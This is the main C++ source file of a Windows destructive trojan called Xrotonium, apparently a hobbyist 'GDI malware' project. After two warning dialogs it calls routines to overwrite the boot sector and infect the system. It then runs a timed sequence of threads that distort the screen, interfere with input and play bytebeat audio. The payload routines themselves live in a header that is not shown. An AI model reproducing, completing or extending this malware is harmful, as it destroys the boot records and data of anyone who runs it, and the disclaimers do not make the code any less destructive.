#include "Xrotonium.h"

void EndPayload(HANDLE hPayload) {
	TerminateThread(hPayload, 0);
	CloseHandle(hPayload);
}

DWORD WINAPI RepeatMsg(LPVOID pvoid) {
	while (true) {
		MessageBoxW(NULL, L"THE END IS COMING!!!", L"THE END IS COMING!!!", MB_ICONWARNING);
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow) {
	if (MessageBoxW(NULL, L"Warning!\n\nYou are about to execute a malware called Xrotonium.exe (NotCCR\'s last Purgatorium remake) that will copy itself to system folders, overwrite the MBR, screw up text and corrupt the registry!\nNotCCR isn\'t responsible for any damage made by executing this software, reverse engineering it, or any subsequent artificial removal of this message box.\n\nIf you want to run this on a virtual machine, you may click \'Yes\' to proceed.\nHowever, if you are running on real hardware and your data is put at risk, then click \'No\' and remove this malware file quickly.\n\nAs said earlier, NotCCR, the creator of this trojan, is not responsible for any damages made using this malware.\nStill execute it?", L"GDI-Trojan.Win32.Xrotonium - Malware Warning", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES) exit(0);
	if (MessageBoxW(NULL, L"This is the last warning!\n\nAs you are already aware of the risks, you may press \'Yes\' to continue, or \'No\' to cancel.\nProceed to execute?", L"FINAL WARNING!!", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES) exit(0);
	Payloads::OverwriteBootSectors();
	Payloads::InfectTheSystem();
	CreateThread(NULL, 0, Payloads::GlitchText, NULL, 0, 0);
	CreateThread(NULL, 0, Payloads::Inputs, NULL, 0, 0);
	Sleep(rand() % 1000);
	Bytebeat::Bytebeat1();
	Sleep(2000);
	HANDLE hISM = CreateThread(NULL, 0, GDI::InitialScreenMovement, NULL, 0, 0);
	Sleep(3000);
	if (!System::isWindowsXP()) System::NotWindowsXP();
	HANDLE hBP = CreateThread(NULL, 0, GDI::BrightPixelate, NULL, 0, 0);
	Sleep(10000);
	// 25 seconds remain
	System::rdw();
	HANDLE hHSLS1 = CreateThread(NULL, 0, GDI::HSLShader1, NULL, 0, 0);
	Sleep(5000);
	HANDLE hRT = CreateThread(NULL, 0, GDI::RotatingTextouts, NULL, 0, 0);
	HANDLE hSPAD = CreateThread(NULL, 0, GDI::SrcPaintAndDisp, NULL, 0, 0);
	EndPayload(hBP);
	Sleep(10000);
	// 10 seconds remain
	HANDLE hCAR = CreateThread(NULL, 0, GDI::CustomANDRoto, NULL, 0, 0);
	Sleep(5000);
	HANDLE hOP = CreateThread(NULL, 0, GDI::OrPixelate, NULL, 0, 0);
	Sleep(5000);
	EndPayload(hISM); EndPayload(hHSLS1); EndPayload(hRT);
	EndPayload(hSPAD); EndPayload(hCAR); EndPayload (hOP); // I want to die
	System::rdw();
	HANDLE hKE = CreateThread(NULL, 0, GDI::KaleidoscopeEffect, NULL, 0, 0);
	HANDLE hEPS = CreateThread(NULL, 0, GDI::EllipsePatShake, NULL, 0, 0);
	Bytebeat::Bytebeat2();
	Sleep(15000);
	EndPayload(hKE); EndPayload(hEPS);
	System::rdw();
	HANDLE hSphere = CreateThread(NULL, 0, GDI::ErrorSphere, NULL, 0, 0);
	HANDLE hSL = CreateThread(NULL, 0, GDI::ScreenLines, NULL, 0, 0);
	HANDLE hHSLS2 = CreateThread(NULL, 0, GDI::HSLSierpinski, NULL, 0, 0);
//	Bytebeat::Bytebeat3();
	Sleep(30000);
	EndPayload(hSL); EndPayload(hHSLS2);
	System::rdw();
	HANDLE hSM = CreateThread(NULL, 0, GDI::ScreenMelter, NULL, 0, 0);
	HANDLE hHSLS1R = CreateThread(NULL, 0, GDI::HSLShader1, NULL, 0, 0);
	Bytebeat::Bytebeat4();
	Sleep(25000);
	EndPayload(hSM); EndPayload(hSphere);
	HANDLE hTS = CreateThread(NULL, 0, GDI::TrigonShake, NULL, 0, 0);
	Bytebeat::Bytebeat5();
	Sleep(5000);
	HANDLE hRot = CreateThread(NULL, 0, GDI::Rotator, NULL, 0, 0);
	HANDLE hAR = CreateThread(NULL, 0, GDI::ANDDispRoto, NULL, 0, 0);
	Sleep(10000);
	EndPayload(hHSLS1R); EndPayload(hTS); EndPayload(hRot);
	HANDLE hADAR = CreateThread(NULL, 0, GDI::ANDDispAbsRoto, NULL, 0, 0);
	HANDLE hKE2 = CreateThread(NULL, 0, GDI::KaleidoscopeEffect, NULL, 0, 0);
	HANDLE hEPS2 = CreateThread(NULL, 0, GDI::EllipsePatShake, NULL, 0, 0);
	HANDLE hSM2 = CreateThread(NULL, 0, GDI::ScreenMelter, NULL, 0, 0);
	HANDLE hHAR = CreateThread(NULL, 0, GDI::HalftoneANDRoto, NULL, 0, 0);
	Sleep(20000);
	EndPayload(hADAR); EndPayload(hKE2); EndPayload(hEPS2); EndPayload(hSM2); EndPayload(hHAR);
	System::rdw();
	CreateThread(NULL, 0, GDI::ScreenStatic, NULL, 0, 0);
	Sleep(INFINITE);
}
